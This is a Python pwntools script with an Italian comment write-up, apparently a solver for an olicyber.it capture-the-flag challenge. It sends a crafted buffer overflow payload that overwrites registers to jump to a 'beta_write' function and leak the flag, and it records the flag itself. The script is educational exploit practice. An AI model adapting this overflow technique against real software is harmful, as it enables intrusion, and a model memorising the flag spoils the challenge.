#! /usr/bin/env python3

# WRITE UP
#  non so nemmno io bene cosa ho fatto, ho costruito passo dopo passo, tipo in 3 ore
# e non capisco nemmeno perche se cambio qualcosa non funziona piu quindi lascio cosi
# comunque partiamo con le cose principali

# beta_write e la funzione vulnerabile, vogliamo saltare a questa funzione
# metto questo indirizzo sulla lista film, questo e inputTarget

# poi inserisco con offset +8 lindirizzo dove ha caricato la flag
# inserisco quanti caratteri voglio printare, dato che usa syscall

# poi tutti registri che ho non so ora bene perche ho messo quelli
# forse potrebbero ndare anche a caso tranne il ecx

# si ho provato ora infatti funziona anche se sono tutti zero tranne ecx
# che e quello imporante

# WRITE UP END



from pwn import *
import struct
# conn = process('./augharder')

conn = remote('augharder.challs.olicyber.it', 10607)
# conn.recvuntil("> ")

# prova

# non so bene nemmeno io perche esattamente ho fatto cosi pero funziona

flag = struct.pack('I', 0x00000000) # prende indirizzo per saltare a beta_write!??
ecx = struct.pack('I', 0x0804b0a4) # prender`a l' indirizzo da lista film
esp = struct.pack("I", 0x00000000) # pointer per dove voglio saltare!
ebp = struct.pack("I", 0x00000000) # dove salto

target = b"134514250" # indirizzo di beta_write codificato

flag_int = int('0804b060',16)
if flag_int > 2147483647:
    flag_int -= 0xffffffff + 1

inputTarget = b'3\n1\n' + target + b'\n'
input_flag = b'3\n3\n' + str(flag_int).encode() + b'\n'
input_len = b'3\n4\n' + str(100).encode() + b'\n'
payload = b'5\naaaaaaaaca' + flag + b'aaeaaafaaagaaaha' + ecx + ebp + esp + b'AAAAAAA'

conn.sendline( inputTarget + input_flag + input_len + payload)


conn.interactive()
# flag{di3ci_p1ccol1_endian1}


# costruisco a manina il payload
# import struct
# # ecx = struct.pack('I', 0x0804b060) # 

# flag = struct.pack('I', 0x0804b060) # prende indirizzo per saltare a beta_write!??
# ecx = struct.pack('I', 0x0804b0a4) # prender`a l' indirizzo da lista film
# esp = struct.pack("I", 0x0804a500) # pointer per dove voglio saltare!
# ebp = struct.pack("I", 0x08048669) # dove salto

# target = b"134514250" # indirizzo di beta_write codificato
# flag_int = int('0804b060',16)
# if flag_int > 2147483647:
#     flag_int -= 0xffffffff + 1
# with open('/tmp/prova.txt', 'wb') as f:
#     inputTarget = b'3\n1\n' + target + b'\n'
#     input_flag = b'3\n3\n' + str(flag_int).encode() + b'\n'
#     input_len = b'3\n4\n' + str(100).encode() + b'\n'
#     payload = b'5\naaaaaaaaca' + flag + b'aaeaaafaaagaaaha' + ecx + ebp + esp + b'AAAAAAA'
#     f.write( inputTarget + input_flag + input_len + payload)




# region provavo a farlo in modo classico ma troppooo
# immetto lindirizzo
# conn.sendline('3\n1')
# beta_write_location = int('0804864a',16)
# if beta_write_location > 2147483647:
#     beta_write_location -= 0xffffffff + 1
# conn.sendline(str(beta_write_location))
# print(beta_write_location, 'ora si va')

# conn.sendline('3\n3')
# flag_int = int('0804b060',16)
# if flag_int > 2147483647:
#     flag_int -= 0xffffffff + 1
# conn.sendline(str(flag_int))

# conn.sendline('3\n4\n100') # cos`i printa 100 caratteri

# # procedo con l exploit
# conn.sendline('5')

# flag = struct.pack('I', 0x0804b060) # indirizzo della flag
# ecx = struct.pack('I', 0x0804871c) # prende indirizzo per saltare a beta_write!??
# esp = struct.pack("I", 0x0804a500) # non so cosa mi serva
# ebp = struct.pack("I", 0x08048669) # non so cosa mi serva

# salto = struct.pack("I", 0x0804864a)

# conn.sendline(b'aaaaaaaaca' + flag + b'aaeaaafaaagaaaha' + ecx + ebp + esp + b'AAAAAAA')

# conn.interactive()
# endregion